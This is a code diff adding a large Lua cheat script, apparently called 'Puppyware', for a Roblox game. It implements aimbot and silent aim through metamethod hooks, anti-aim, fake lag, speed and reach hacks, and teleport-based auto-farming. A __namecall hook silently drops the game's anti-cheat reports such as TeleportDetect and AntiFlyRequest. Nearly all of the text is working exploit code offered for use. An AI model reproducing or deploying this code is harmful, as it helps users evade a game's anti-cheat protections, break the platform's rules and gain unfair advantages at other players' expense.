+                if (not PuppywareSettings.Aiming.Whitelist.FriendsWhitelist or not table.find(PuppywareSettings.Aiming.Whitelist.Friends, v.Name)) and (not PuppywareSettings.Aiming.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not PuppywareSettings.Aiming.Whitelist.Enabled or not table.find(PuppywareSettings.Aiming.Whitelist.Players, v.Name)) then
+                    Target = v
+                    Distance = DistanceFromMouse
+                end
+            end
+        end
+    end
+
+    return Target, Distance
+end
+
+function NearestType(Type)
+    if Type == "Distance" then
+        return NearestDistance()
+    elseif Type == "Mouse" then
+        return NearestMouse()
+    end
+end
+
+function Jitter(Speed, Angle)
+    if Alive(LocalPlayer) then
+        local Jit = Speed or math.random(30, 90)
+        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) * CFrame.Angles(0, math.rad(Angle) + math.rad((math.random(1, 2) == 1 and Jit or -Jit)), 0) 
+    end
+end
+
+function TableLowerFind(Table, CurrentName)
+    local TableName
+    for i, v in pairs(Table) do
+        if string.find(CurrentName:gsub("%[", ""):gsub("%]", ""):lower(), v:lower()) then
+            TableName = v
+        end
+    end
+    return TableName
+end
+    
+function Spin(Speed)
+    if Alive(LocalPlayer) then
+        LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(Speed), 0)
+    end
+end
+
+function TeleportBuy(Target, AutoSetDelay)
+    if workspace.Ignored.Shop:FindFirstChild(Target) and Alive(LocalPlayer) then
+        PuppywareModule.Old.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+        wait(0.05)
+        LocalPlayer.Character.HumanoidRootPart.CFrame = Workspace.Ignored.Shop[Target].Head.CFrame * CFrame.new(0, 3, 0)
+        wait(0.15)
+        if PuppywareSettings.Teleport.AutoPurchase then
+            for i = 1, 10 do
+                fireclickdetector(Workspace.Ignored.Shop[Target].ClickDetector)
+            end
+        end
+        if PuppywareSettings.Teleport.TeleportReturn then
+            wait(PuppywareSettings.Teleport.ReturnDelay)
+            LocalPlayer.Character.HumanoidRootPart.CFrame = PuppywareModule.Old.CFrame  
+        end
+        if AutoSetDelay then
+            wait(1)
+        end
+    end
+end
+
+function Buy(Target, Delay, LagBack)
+    if workspace.Ignored.Shop:FindFirstChild(Target) and Alive(LocalPlayer) then
+        PuppywareModule.Old.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+        wait(0.05)
+        LocalPlayer.Character.HumanoidRootPart.CFrame = Workspace.Ignored.Shop[Target].Head.CFrame * CFrame.new(0, 3, 0)
+        wait(0.15)
+        for i = 1, 3 do
+            fireclickdetector(Workspace.Ignored.Shop[Target].ClickDetector)
+        end
+        if LagBack then
+            wait(1)
+            LocalPlayer.Character.HumanoidRootPart.CFrame = PuppywareModule.Old.CFrame  
+        end
+        if Delay ~= nil then
+            wait(Delay)
+        end
+    end
+end
+
+function Visible(OriginPart, Part)
+    if Alive(LocalPlayer) then
+        local IgnoreList = {CurrentCamera, LocalPlayer.Character, OriginPart.Parent}
+        local Parts = CurrentCamera:GetPartsObscuringTarget({OriginPart.Position, Part.Position}, IgnoreList)
+    
+        for i, v in pairs(Parts) do
+            if v.Transparency >= 0.3 then
+                PuppywareModule.Instance[#PuppywareModule.Instance + 1] = v
+            end
+    
+            if v.Material == Enum.Material.Glass then
+                PuppywareModule.Instance[#PuppywareModule.Instance + 1] = v
+            end
+        end
+    
+        return #Parts == 0
+    end
+    return true
+end
+
+function ToolName(Name)
+    for Check = 1, 100000 do
+        if Workspace.Ignored.Shop:FindFirstChild("[" .. Name .. "] - $" .. Check) then
+            return tostring("[" .. Name .. "] - $" .. Check)
+        end
+    end
+end
+
+function ToolAmmo(Name)
+    for Check1 = 1, 250 do
+        for Check2 = 1, 250 do
+            if Workspace.Ignored.Shop:FindFirstChild(Check1 .. " [" .. Name .. " Ammo] - $" .. Check2) then
+                return tostring(Check1 .. " [" .. Name .. " Ammo] - $" .. Check2)
+            end
+        end
+    end
+end
+
+function Invisible()
+    if Alive(LocalPlayer) then
+        PuppywareModule.Old.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+        print(PuppywareModule.Old.CFrame)
+        wait(0.1)
+        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 96995694596945934234234234, 0)
+        wait(0.1)
+        LocalPlayer.Character.LowerTorso.Root:Destroy()
+        for _, v in pairs(LocalPlayer.Character:GetChildren()) do
+            if v:IsA("MeshPart") and not table.find(PuppywareModule.Ignores, v.Name) then
+                v:Destroy()
+            end
+        end
+        wait(0.1)
+        LocalPlayer.Character.HumanoidRootPart.CFrame = PuppywareModule.Old.CFrame
+    end
+end
+
+function NilBody()
+    if Alive(LocalPlayer) then
+        for i, v in pairs(LocalPlayer.Character:GetChildren()) do
+            if v:IsA("BasePart") or v:IsA("Part") or v:IsA("MeshPart") then
+                if v.Name ~= "HumanoidRootPart" then
+                    v:Destroy()
+                end
+            end
+        end
+    end
+end
+
+function ChanceTable(Table)
+    local Chance = 0
+    for i, v in pairs(Table) do
+        Chance = Chance + v
+    end
+    Chance = math.random(0, Chance)
+    for i, v in pairs(Table) do
+        Chance = Chance - v
+        if Chance <= 0 then
+            return i
+        end
+    end	
+end
+
+function RandomTable(Table)
+    local Values = 0
+    for i, v in pairs(Table) do
+        Values = i
+    end
+    
+    return Table[math.random(1, Values)]
+end
+
+function Remove(Data, Data2)
+    for i, v in pairs(Data) do
+        if v == Data2 then
+            table.remove(Data, i)
+        end
+    end
+end
+
+function IsVisible(GetPosition, IgnoreLists)
+    return #CurrentCamera:GetPartsObscuringTarget({game.Players.LocalPlayer.Character.Head.Position, GetPosition}, IgnoreLists) == 0 and true or false
+end
+
+function GodFunction(Variable)
+    LocalPlayer.Character.RagdollConstraints:Destroy()
+    local Folder = Instance.new("Folder", LocalPlayer.Character)
+    Folder.Name = "FULLY_LOADED_CHAR"
+    wait()
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+    Variable = false
+end
+
+function Cham(Data, State)
+    local BoxVar = nil
+    local GlowVar = nil
+    if State then
+        for _, v in pairs(Data.Character:GetChildren()) do
+            if v:IsA("BasePart") and v.Transparency ~= 1 then
+                if not v:FindFirstChild("Box") then
+                    BoxVar = Instance.new("BoxHandleAdornment", v)
+                    BoxVar.Name = "Box"
+                    BoxVar.AlwaysOnTop = true
+                    BoxVar.ZIndex = 4
+                    BoxVar.Adornee = v
+                    BoxVar.Color3 = Color3.fromRGB(0, 153, 153)
+                    BoxVar.Transparency = 0.5
+                    BoxVar.Size = v.Size + Vector3.new(0.02, 0.02, 0.02)
+                end
+            end
+        end
+    else
+        for i, v in pairs(Data.Character:GetChildren()) do
+            if v:IsA("BasePart") and v.Transparency ~= 1 then
+                if v:FindFirstChild("Box") then
+                    v["Box"]:Destroy()
+                end
+            end
+        end
+        
+        return BoxVar, GlowVar
+    end
+end
+
+UserInputService.InputBegan:Connect(function(Key, Event)
+    if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Event then
+        PuppywareSettings.Aiming.Aimbot.IsAiming = true
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(Key, Event)
+    if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Event then
+        Settings.Aiming.Aimbot.IsAiming = false
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    if armor[1] == true then
+       for i,v in pairs(game.Workspace.Ignored.Pads:GetDescendants()) do
+           if v.Name == "Head" then
+               v.CFrame = game.Players.localPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,3,0)
+           end
+       end
+       if game.Players.LocalPlayer.BodyEffects.Armor.Value ~= 100 then
+           for i,v in pairs(game.Workspace.Ignored.Pads:GetDescendants()) do
+              if v.Name == "ClickDetector" then
+                 fireclickdetector(v)
+              end
+           end
+       end
+    end
+    if spamdb == true then
+	   game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(game.Players.LocalPlayer:GetMouse().Hit.p, game:GetService("Players").LocalPlayer.Character.DB)
+       game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(game.Players.LocalPlayer:GetMouse().Hit.p, game:GetService("Players").LocalPlayer.Character.DB)
+       game:GetService("ReplicatedStorage"):WaitForChild("ReloadWeapon"):FireServer()
+       game.Players.LocalPlayer.Backpack['DB'].Parent =  game.Players.LocalPlayer.Character
+    end
+    updatebbl()
+	updateline()
+    
+    if resolver then
+        if not nt then
+            return
+        end
+        if (not RootPart) or (not RootPart.Parent) or (not RootPart.Parent.Parent) then
+            RootPart = nt:FindFirstChild("HumanoidRootPart")
+        else
+            RVelocity = RootPart.Velocity
+            RootPart.Velocity = type(Vector3.new(0,-500,0)) == "vector" and Vector3.new(0,-500,0)
+
+            RunService.RenderStepped:wait()
+        
+            RootPart.Velocity = RVelocity
+        end
+    end
+    
+    if nopred then
+        nopr = game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity
+        game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0,0,0)
+        RunService.RenderStepped:Wait()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = nopr
+    end
+    if underground then
+        sen = game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity
+        game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0,-150,0)
+        RunService.RenderStepped:Wait()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = sen
+    end
+    if sky then
+        sky = game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity
+        game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0,150,0)
+        RunService.RenderStepped:Wait()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = sky
+    end
+    if customanti then
+        cstm = game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity
+        game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(Xval, Yval, Zval)
+        game:GetService("RunService").RenderStepped:Wait()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = cstm
+    end
+    if Alive(LocalPlayer) then
+        if PuppywareSettings.Blatant.Movement.SpeedEnabled and PuppywareSettings.Blatant.Movement.SpeedType == "CFrame" then
+            if PuppywareSettings.Blatant.Movement.SpeedRenderType == "Default" then
+                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
+                    for i = 1, PuppywareSettings.Blatant.Movement.SpeedAmount do
+                        LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection)
+                    end
+                end
+            end
+        end
+        if PuppywareSettings.Blatant.Character.AntiStomp then
+            if Knocked(LocalPlayer) then
+                if PuppywareSettings.Blatant.Character.AntiStompType == "Nil Char" then
+                    NilBody()
+                end
+                if PuppywareSettings.Blatant.Character.AntiStompType == "Show Body" then
+                    pcall(function()
+                        LocalPlayer.Character.Humanoid:Destroy()
+                    end)
+                end
+            end
+        end
+        if PuppywareSettings.Blatant.Character.AntiBag then
+            if LocalPlayer.Character:FindFirstChild("Christmas_Sock") then
+                LocalPlayer.Character:FindFirstChild("Christmas_Sock"):Destroy()
+            end
+        end
+        if PuppywareSettings.Blatant.Character.AntiGrab and LocalPlayer.Character:FindFirstChild("GRABBING_CONSTRAINT") then
+            LocalPlayer.Character["GRABBING_CONSTRAINT"]:Destroy()
+        end
+    end
+end)
+
+
+RunService.Stepped:Connect(function()
+	if PuppywareSettings.Blatant.BlatantAA.UndergroundWallbang then
+		for i, v in pairs(LocalPlayer.Character:GetDescendants()) do
+			if v:IsA("BasePart") and v.CanCollide == true then
+				v.CanCollide = false
+			end
+		end
+	end
+end)
+spawn(function()
+    while wait() do
+        if Alive(LocalPlayer) then
+            if PuppywareSettings.Blatant.Character.AutoLettuce then
+                pcall(function()
+                    Buy("[Lettuce] - $5", 1)
+                    if LocalPlayer.Backpack:FindFirstChild("[Lettuce]") then
+                        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack["[Lettuce]"])
+                    end
+                    wait(0.5)
+                    LocalPlayer.Character["[Lettuce]"]:Activate()
+                end)
+            end
+            if PuppywareSettings.Blatant.Character.AutoReload then
+                local Gun = LocalPlayer.Character:FindFirstChildOfClass("Tool")
+                if Gun ~= nil and Gun:FindFirstChild("MaxAmmo") then
+                    if Gun.Ammo.Value == 0 then
+                        ReplicatedStorage.MainEvent:FireServer("Reload", Gun)
+                    end
+                end
+            end
+            if PuppywareSettings.Blatant.Character.AutoArmor then
+                if LocalPlayer.Character.BodyEffects.Armor.Value == 0 then
+                    Buy("[High-Medium Armor] - $2300", 0.5, true)
+                end
+            end
+            if PuppywareSettings.Blatant.Farming.MuscleFarm then
+                pcall(function()
+                    if PuppywareSettings.Blatant.Farming.MuscleFarmingType == "Normal" then
+                        if not LocalPlayer.Backpack:FindFirstChild("[Weights]") then
+                            Buy("[Weights] - $120", 1)
+                        end
+                        if LocalPlayer.Backpack:FindFirstChild("[Weights]") then
+                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack["[Weights]"])
+                        end
+                        LocalPlayer.Character["[Weights]"]:Activate()
+                    end
+                    if PuppywareSettings.Blatant.Farming.MuscleFarmingType == "Heavy" then
+                        if not LocalPlayer.Backpack:FindFirstChild("[HeavyWeights]") then
+                            Buy("[HeavyWeights] - $250", 1)
+                        end
+                        if LocalPlayer.Backpack:FindFirstChild("[HeavyWeights]") then
+                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack["[HeavyWeights]"])
+                        end
+                        LocalPlayer.Character["[HeavyWeights]"]:Activate()
+                    end
+                end)
+            end
+            if PuppywareSettings.Blatant.Farming.ShoeFarm then
+                pcall(function()
+                    for i, v in pairs(Workspace.Ignored.Drop:GetChildren()) do
+                        if v.Name == "MeshPart" then
+                            LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame * CFrame.new(0, 2, 0)
+                            local ShoeDistance = (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+                            if ShoeDistance < 25 then
+                                fireclickdetector(v.ClickDetector)
+                            end
+                        else
+                            fireclickdetector(Workspace.Ignored["Clean the shoes on the floor and come to me for cash"].ClickDetector)
+                        end
+                    end
+                end)
+            end
+            if PuppywareSettings.Blatant.Farming.HospitalFarm then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(116, 23, -479)
+                for _, v in pairs(Workspace.Ignored.HospitalJob:GetChildren()) do
+                    if v.Name == "Can I get the Green bottle" then
+                        fireclickdetector(v.Parent.Green.ClickDetector)
+                        wait(1)
+                        fireclickdetector(v.ClickDetector)
+                    end
+                    if v.Name == "Can I get the Blue bottle" then
+                        fireclickdetector(v.Parent.Blue.ClickDetector)
+                        wait(1)
+                        fireclickdetector(v.ClickDetector)
+                    end
+                    if v.Name == "Can I get the Red bottle" then
+                        fireclickdetector(v.Parent.Red.ClickDetector)
+                        wait(1)
+                        fireclickdetector(v.ClickDetector)
+                    end
+                end
+            end
+            if PuppywareSettings.Blatant.Farming.BoxFarm then
+                pcall(function()
+                    LocalPlayer.Character.HumanoidRootPart.CFrame = Workspace.MAP.Map.ArenaBOX.PunchingBagInGame["pretty ransom"].CFrame * CFrame.new(0, -1, 3)
+                    if LocalPlayer.Backpack:FindFirstChild("Combat") then
+                        LocalPlayer.Backpack.Combat.Parent = LocalPlayer.Character
+                    end
+                end)
+                mouse1click()
+            end
+        end
+    end
+end)
+
+spawn(function()
+    while wait() do
+        if PuppywareSettings.Blatant.Farming.ATMFarm then
+            for _, v in pairs(Workspace.Cashiers:GetChildren()) do
+                if v:FindFirstChild("Head") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+                    repeat
+                        PuppywareSettings.Blatant.Farming.ATMPick = false
+                        wait()
+                        if PuppywareSettings.Blatant.Farming.ATMFarm then
+                            if Alive(LocalPlayer) then
+                                LocalPlayer.Character.HumanoidRootPart.CFrame = v.Head.CFrame * CFrame.new(0, -1, 2.5)
+                                if LocalPlayer.Backpack:FindFirstChild("Combat") then
+                                    LocalPlayer.Backpack.Combat.Parent = LocalPlayer.Character
+                                end
+                                --if LocalPlayer.Character:FindFirstChild("Combat") then
+                                    LocalPlayer.Character["Combat"]:Activate()
+                                --end
+                            end
+                        end
+                    until v.Humanoid.Health <= 0 or not PuppywareSettings.Blatant.Farming.ATMFarm
+                    pcall(function()
+                        LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
+                    end)
+                    PuppywareSettings.Blatant.Farming.ATMPick = true
+                    wait(5)
+                end
+            end
+        end
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if Alive(LocalPlayer) then
+        if PuppywareSettings.Aiming.AimingSettings.PingBasedPrediction then
+            local PingStats = GetService.Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
+            local Value = tostring(PingStats)
+            local PingValue = Value:split(" ")
+            local PingNumber = tonumber(PingValue[1])
+    
+            if PingNumber < 130 then
+                PuppywareSettings.Aiming.AimingSettings.GetVelocity = PingNumber / 1000 + 0.037
+            else
+                PuppywareSettings.Aiming.AimingSettings.GetVelocity = PingNumber / 1000 + 0.033
+            end
+        else
+            PuppywareSettings.Aiming.AimingSettings.GetVelocity = 0.165
+        end
+        if PuppywareSettings.Blatant.Cash.AutoDrop then
+            ReplicatedStorage.MainEvent:FireServer("DropMoney", tostring(PuppywareSettings.Blatant.Cash.AutoDropAmount))
+        end
+        if PuppywareSettings.Blatant.Cash.AutoPickCash then
+            pcall(function()
+                for _, v in pairs(Workspace.Ignored.Drop:GetChildren()) do
+                    if v.Name == "MoneyDrop" then
+                        local MoneyMagnitude = (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude
+                        if MoneyMagnitude < 25 then
+                            fireclickdetector(v.ClickDetector)
+                        end 
+                    end
+                end
+            end)
+        end
+        if PuppywareSettings.Blatant.Farming.ATMPick then
+            pcall(function()
+                for _, v in pairs(Workspace.Ignored.Drop:GetChildren()) do
+                    if v.Name == "MoneyDrop" then
+                        local MoneyMagnitude = (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+                        if MoneyMagnitude < 25 then
+                            fireclickdetector(v.ClickDetector)
+                        end 
+                    end
+                end
+            end)
+        end
+        if PuppywareSettings.Blatant.Movement.SpeedEnabled and PuppywareSettings.Blatant.Movement.SpeedType == "CFrame" then
+            if PuppywareSettings.Blatant.Movement.SpeedRenderType == "Fast" and Alive(LocalPlayer) then
+                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
+                    for i = 1, PuppywareSettings.Blatant.Movement.SpeedAmount do
+                        LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection)
+                    end
+                end
+            end
+        end
+        if PuppywareSettings.Blatant.Reaching.FistReach and LocalPlayer.Character.LeftHand.Transparency ~= 1 then
+            LocalPlayer.Character.LeftHand.Size = Vector3.new(45, 45, 45)
+            LocalPlayer.Character.RightHand.Size = Vector3.new(45, 45, 45)
+            LocalPlayer.Character.RightHand.Massless = true
+            LocalPlayer.Character.LeftHand.Massless = true
+            LocalPlayer.Character.RightHand.Transparency = 1
+            LocalPlayer.Character.LeftHand.Transparency = 1
+        end
+        if PuppywareSettings.Blatant.Reaching.MeleeReach then
+            local Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
+            if Tool ~= nil and not Tool:FindFirstChild("Ammo") and TableLowerFind(PuppywareModule.Teleport.Melee, Tool.Name) ~= nil and Tool:FindFirstChild("Handle") then
+                if Tool.Handle.Transparency ~= 1 then
+                    Tool.Handle.Size = Vector3.new(45, 45, 45)
+                    Tool.Handle.Transparency = 1
+                end
+            end
+        else
+            local Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
+            if Tool ~= nil and not Tool:FindFirstChild("Ammo") and TableLowerFind(PuppywareModule.Teleport.Melee, Tool.Name) ~= nil and Tool:FindFirstChild("Handle") then
+                if Tool.Handle.Transparency == 1 then
+                    if Tool.Name == "knife" then
+                        Tool.Handle.Size = Vector3.new(2.19574, 0.449288, 0.102495)
+                    end
+                    if Tool.Name == "bat" then
+                        Tool.Handle.Size = Vector3.new(0.559523, 4.68133, 0.559523)
+                    end
+                    if Tool.Name == "pencil" then
+                        Tool.Handle.Size = Vector3.new(0.375586, 1.9, 0.375587)
+                    end
+                    if Tool.Name == "pitchfork" then
+                        Tool.Handle.Size = Vector3.new(1.0553, 5.86135, 0.316619)
+                    end
+                    if Tool.Name == "shovel" then
+                        Tool.Handle.Size = Vector3.new(1.68383, 5.903, 0.337731)
+                    end
+                    Tool.Handle.Transparency = 0
+                end
+            end
+        end
+        if PuppywareSettings.Blatant.LegitAA.Enabled then
+            if PuppywareSettings.Blatant.LegitAA.AntiPointAt then
+                for i, v in next, Players:GetPlayers() do
+                    if v ~= LocalPlayer and Alive(v) and Alive(LocalPlayer) then
+                        local BodyEffects = v.Character:FindFirstChild("BodyEffects")
+                        local MousePos = BodyEffects:FindFirstChild("MousePos")
+                        if BodyEffects ~= nil and MousePos ~= nil then
+                            local EnemyMouseMagnitude = (LocalPlayer.Character.HumanoidRootPart.Position - MousePos.Value).Magnitude
+                            if PuppywareSettings.Blatant.LegitAA.AntiAimAtDistance > EnemyMouseMagnitude then
+                                Root.CFrame = Root.CFrame * CFrame.new(math.random(1, 2) == 1 and 2 or -2, 0, 0)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        if PuppywareSettings.Blatant.BlatantAA.Enabled then
+                if PuppywareSettings.Blatant.BlatantAA.AntiAimType == "Jitter" then
+                    Jitter(PuppywareSettings.Blatant.BlatantAA.AntiAimSpeed, PuppywareSettings.Blatant.BlatantAA.JitterAngle)
+                else
+                    Spin(PuppywareSettings.Blatant.BlatantAA.AntiAimSpeed)
+                end
+                if PuppywareSettings.Blatant.BlatantAA.NoAutoRotate then
+                    LocalPlayer.Character.Humanoid.AutoRotate = false
+                else
+                    LocalPlayer.Character.Humanoid.AutoRotate = true
+                end
+        else
+            LocalPlayer.Character.Humanoid.AutoRotate = true
+        end
+    end
+    if PuppywareSettings.Aiming.TargetAimSettings.UnlockTargetKnocked then
+        if PuppywareSettings.Aiming.TargetAimSettings.Target ~= nil and Players:FindFirstChild(PuppywareSettings.Aiming.TargetAimSettings.Target) then
+            if Knocked(Players:FindFirstChild(PuppywareSettings.Aiming.TargetAimSettings.Target)) then
+                PuppywareSettings.Aiming.TargetAimSettings.Target = nil
+            end
+        end
+    end
+    if PuppywareSettings.Aiming.SilentAim.ShowFOV then
+        SilentAimFOV.Visible = true
+        SilentAimFOV.Radius = PuppywareSettings.Aiming.FOV.SilentAimSize
+        SilentAimFOV.Filled = PuppywareSettings.Aiming.FOV.FOVFilled
+        SilentAimFOV.Transparency = PuppywareSettings.Aiming.FOV.Transparency
+        SilentAimFOV.NumSides = 100
+        SilentAimFOV.Color = PuppywareSettings.Aiming.SilentAim.FOVColor
+        SilentAimFOV.Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
+    else
+        SilentAimFOV.Visible = false
+    end
+    if PuppywareSettings.Aiming.Aimbot.Enabled then
+        if PuppywareSettings.Aiming.Aimbot.ShowFOV then
+            AimbotFOV.Visible = true
+            AimbotFOV.Radius = PuppywareSettings.Aiming.FOV.AimAssistSize
+            AimbotFOV.Filled = PuppywareSettings.Aiming.FOV.FOVFilled
+            AimbotFOV.Transparency = PuppywareSettings.Aiming.FOV.Transparency
+            AimbotFOV.NumSides = 100
+            AimbotFOV.Color = PuppywareSettings.Aiming.Aimbot.FOVColor
+            AimbotFOV.Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
+        else
+            AimbotFOV.Visible = false
+        end
+        if PuppywareSettings.Aiming.Aimbot.AimAssist and PuppywareSettings.Aiming.Aimbot.IsAiming then
+            local NearestTarget, NearestDistance = NearestType(PuppywareSettings.Aiming.Aimbot.UseNearestDistance and "Distance" or "Mouse")
+
+            if NearestTarget and (not PuppywareSettings.Aiming.Aimbot.GrabbedCheck or not Grabbing(NearestTarget)) and (not PuppywareSettings.Aiming.Aimbot.KnockedOutCheck or not Knocked(NearestTarget)) and (not PuppywareSettings.Aiming.Aimbot.ShowFOV or PuppywareSettings.Aiming.FOV.AimAssistSize > NearestDistance) and (not PuppywareSettings.Aiming.Aimbot.WallCheck or Visible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) then
+                local TargetPart = (NearestTarget.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and NearestTarget.Character.LeftFoot or NearestTarget.Character[RandomTable(PuppywareSettings.Aiming.Aimbot.Hitboxes)])
+                local Prediction = (PuppywareSettings.Aiming.TargetAimSettings.MovementPrediction and TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.TargetAimSettings.MovementPredictionAmount) or TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.AimingSettings.GetVelocity))
+                
+                if PuppywareSettings.Aiming.AimbotSettings.AimAssistType == "Mouse" then
+                    local NearestPosition, NearestVisible = CurrentCamera:WorldToScreenPoint(Prediction.Position)
+                    local MouseLocation = CurrentCamera:WorldToScreenPoint(Mouse.Hit.Position)
+                    local EndPosition = (PuppywareSettings.Aiming.AimbotSettings.SmoothingTracing and Vector2.new((NearestPosition.X - MouseLocation.X) / PuppywareSettings.Aiming.AimbotSettings.SmoothingTracingAmount, (NearestPosition.Y - MouseLocation.Y) / PuppywareSettings.Aiming.AimbotSettings.SmoothingTracingAmount) or Vector2.new((NearestPosition.X - MouseLocation.X) / 1.4, (NearestPosition.Y - MouseLocation.Y) / 1.4))
+                    
+                    if NearestVisible then
+                        mousemoverel(EndPosition.X, EndPosition.Y)
+                    end
+                elseif PuppywareSettings.Aiming.AimbotSettings.AimAssistType == "Camera" then
+                    CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Prediction.Position)
+                end
+            end
+        end
+    else
+        AimbotFOV.Visible = false
+    end
+end)
+
+spawn(function()
+    while wait(1 / 16) do
+        LagTick = math.clamp(PuppywareModule.LagTick + 1, 0, PuppywareSettings.Blatant.FakeLag.TriggerAmount)
+        if Alive(Player) and PuppywareSettings.Blatant.FakeLag.Enabled then
+            if LagTick == math.random(1, PuppywareSettings.Blatant.FakeLag.TriggerAmount) then
+                Network:SetOutgoingKBPSLimit(9e9)
+                PuppywareFolder:ClearAllChildren()
+                LagTick = 0
+                --[[
+                    if Settings.Visuals.PlayerESP.FakeLag.Cham then
+                        for i, v in pairs(Player.Character:GetChildren()) do
+                            if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
+                                local ShadowPart = Instance.new("Part")
+                                ShadowPart.CFrame = v.CFrame
+                                ShadowPart.Anchored = true
+                                ShadowPart.CanCollide = false
+                                ShadowPart.Material = Enum.Material.ForceField
+                                ShadowPart.Color = Settings.Visuals.PlayerESP.FakeLag.Color
+                                ShadowPart.Name = v.Name
+                                ShadowPart.Transparency = 0
+                                ShadowPart.Size = v.Size
+                                ShadowPart.Parent = FakeLagFolder
+                            end
+                        end
+                    end
+                ]]
+            else
+                if PuppywareSettings.Blatant.FakeLag.Enabled then
+                    Network:SetOutgoingKBPSLimit(1)
+                end
+            end
+        else
+            PuppywareFolder:ClearAllChildren()
+            Network:SetOutgoingKBPSLimit(9e9)
+        end
+    end
+end)
+
+local __namecall
+__namecall = hookmetamethod(game, "__namecall", function(self, ...)
+    local Args = {...}
+    local Method = getnamecallmethod()
+
+    if tostring(self.Name) == "MainEvent" and tostring(Method) == "FireServer" then
+        if Args[1] == "TeleportDetect" or Args[1] == "CHECKER_1" or Args[1] == "OneMoreTime" or Args[1] == "AntiFlyRequest" then
+            return
+        end
+    end
+
+    return __namecall(self, ...)
+end)
+
+local __index
+__index = hookmetamethod(game, "__index", function(self, key)
+    if self == Mouse and (tostring(key) == "Hit" or tostring(key) == "Target") then
+        if PuppywareSettings.Aiming.TargetAim.Enabled then
+            if PuppywareSettings.Aiming.TargetAim.Target ~= nil and ChanceTable(PuppywareSettings.Aiming.AimingSettings.HitChanceAmount) == "HitPercent" then
+                if Players:FindFirstChild(PuppywareSettings.Aiming.TargetAim.Target) ~= nil and (not PuppywareSettings.Aiming.TargetAim.GrabbedCheck or not Grabbing(Players[PuppywareSettings.Aiming.TargetAim.Target])) and (not PuppywareSettings.Aiming.TargetAim.KnockedOutCheck or not Knocked(Players[PuppywareSettings.Aiming.TargetAim.Target])) and (not PuppywareSettings.Aiming.TargetAim.ShowFOV or PuppywareSettings.Aiming.FOV.TargetAimSize > (LocalPlayer.Character.Head.Position - Players[PuppywareSettings.Aiming.TargetAim.Target].Character.Head.Position).Magnitude) and (not PuppywareSettings.Aiming.TargetAim.WallCheck or Visible(Players[PuppywareSettings.Aiming.TargetAim.Target].Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) then
+                    local TargetPart = (Players[PuppywareSettings.Aiming.TargetAim.Target].Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and Players[PuppywareSettings.Aiming.TargetAim.Target].Character.LeftFoot or Players[PuppywareSettings.Aiming.TargetAim.Target].Character[RandomTable(PuppywareSettings.Aiming.TargetAim.Hitboxes)])
